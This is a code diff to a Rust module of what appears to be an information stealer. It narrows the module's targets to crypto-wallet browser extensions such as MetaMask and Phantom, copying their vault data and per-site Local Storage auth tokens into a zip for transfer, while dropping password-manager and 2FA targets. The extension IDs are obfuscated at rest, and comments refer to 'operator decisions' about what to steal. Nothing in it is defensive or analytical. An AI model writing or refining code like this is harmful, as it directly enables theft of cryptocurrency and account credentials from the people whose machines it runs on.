@@ -1,7 +1,9 @@
-//! Tier 2: browser extension vaults (crypto wallets, password managers, 2FA).
-//! Copies each profile's extension leveldb dirs into the zip nested under the
-//! browser dir: Browser_<Name>_<Profile>/<ExtensionName>/Local Extension
-//! Settings/<extId>/... and writes root BrowserExtensions.json.
+//! Tier 2: browser extension vaults — crypto wallets only.
+//! Copies each profile's wallet extension leveldb dirs into the zip nested
+//! under the browser dir: Browser_<Name>_<Profile>/<ExtensionName>/Local
+//! Extension Settings/<extId>/... and writes root BrowserExtensions.json.
+//! Password managers, 2FA apps, and unknown extensions are skipped entirely
+//! (operator decision: only wallet vaults justify the transfer weight).
 //! Also sweeps per-site Local Storage leveldb (auth tokens) — IndexedDB and
 //! Session Storage are excluded by operator decision (bloat, near-zero value).
 
@@ -14,14 +16,12 @@ use crate::zipw::ZipBuilder;
 
 const MAX_FILE: u64 = 4 * 1024 * 1024;
 
-/// Well-known extension IDs → display names (wallets, password managers, 2FA).
-/// Every ID below was verified against the Chrome Web Store URL or a public
-/// threat-research target list (see repo notes); unverifiable products are
-/// deliberately absent — they surface under their raw ID. IDs are obfuscated
-/// at rest and decoded per lookup; display names are zip output content.
-fn known_extensions() -> Vec<(String, &'static str)> {
-    vec![
-        // --- Crypto wallets -------------------------------------------------
+/// Well-known crypto wallet extension IDs → display names. Every ID was
+/// verified against the Chrome Web Store URL or a public threat-research
+/// target list. IDs are obfuscated at rest and decoded per lookup; display
+/// names are zip output content. Non-wallet extensions are never collected.
+fn wallet_extension_name(id: &str) -> Option<&'static str> {
+    let pairs: Vec<(String, &'static str)> = vec![
         (crate::obf!("nkbihfbeogaeaoehlefnkodbefgpgknn"), "MetaMask"),
         (crate::obf!("bfnaelmomeimhlpmgjnjophhpkkoljpa"), "Phantom"),
         (crate::obf!("hnfanknocfeofbddgcijnmhnfnkdnaad"), "Coinbase Wallet"),
@@ -63,35 +63,11 @@ fn known_extensions() -> Vec<(String, &'static str)> {
         (crate::obf!("fldfpgipfncgndfolcbkdeeknbbbnhcc"), "MyTonWallet"),
         (crate::obf!("fnjhmkhhmkbjkkabndcnnogagogbneec"), "Ronin"),
         (crate::obf!("kppfdiipphfccemcignhifpjkapfbihd"), "Frontier"),
-        // --- Password managers ----------------------------------------------
-        (crate::obf!("eiaeiblijfjekdanodkjadfinkhbfgcd"), "NordPass"),
-        (crate::obf!("aeblfdkhhhdcdjpifhhbdiojplfjncoa"), "1Password"),
-        (crate::obf!("nngceckbapebfimnlniiiahkandclblb"), "Bitwarden"),
-        (crate::obf!("fdjamakpfbbddfjaooikfcpapjohcfmg"), "Dashlane"),
-        (crate::obf!("hdokiejnpimakedhajhdlcegeplioahd"), "LastPass"),
-        (crate::obf!("bfogiafebfohielmmehodmfbbebbbpei"), "Keeper"),
-        (crate::obf!("pnlccmojcmeohlpggmfnbbiapkmbliob"), "RoboForm"),
-        (crate::obf!("ghmbeldphafepmbegfdlkpapadhbakde"), "Proton Pass"),
-        (crate::obf!("igkpcodhieompeloncfnbekccinhapdb"), "Zoho Vault"),
-        (crate::obf!("admmjipmmciaobhojoghlmleefbicajg"), "Norton Password Manager"),
-        (crate::obf!("kmcfomidfpdkfieipokbalgegidffkal"), "Enpass"),
-        (crate::obf!("caljgklbbfbcjjanaijlacgncafpegll"), "Avira"),
-        (crate::obf!("nhhldecdfagpbfggphklkaeiocfnaafm"), "SAASPASS"),
-        // --- 2FA --------------------------------------------------------------
-        (crate::obf!("bhghoamapcdpbohphigoooaddinpkbai"), "Authenticator"),
-        (crate::obf!("dbfoemgnkgieejfkaddieamagdfepnff"), "2FAS"),
-        (crate::obf!("gmegpkknicehidppoebnmbhndjigpica"), "Web2FA"),
-        (crate::obf!("gaedmjdfmmahhbjefcbgaolhhanlaolb"), "Authy Desktop"),
-    ]
-}
-
-fn extension_name(id: &str) -> String {
-    for (ext_id, name) in known_extensions() {
-        if ext_id == id {
-            return name.to_string();
-        }
-    }
-    id.to_string()
+    ];
+    pairs
+        .into_iter()
+        .find(|(ext_id, _)| ext_id == id)
+        .map(|(_, name)| name)
 }
 
 pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
@@ -182,12 +158,16 @@ fn collect_settings_dir(
             continue;
         }
         let id = entry.file_name().to_string_lossy().into_owned();
+        // Wallets only — password managers, 2FA, and unknown extensions are
+        // skipped entirely (no copy, no manifest entry).
+        let Some(name) = wallet_extension_name(&id) else {
+            continue;
+        };
         let mut files = Vec::new();
         fsutil::walk_files(&ext_dir, MAX_FILE, &mut files);
         if files.is_empty() {
             continue;
         }
-        let name = extension_name(&id);
         let base = format!(
             "Browser_{}_{}/{}/{}/{}",
             browser, profile, name, kind, id
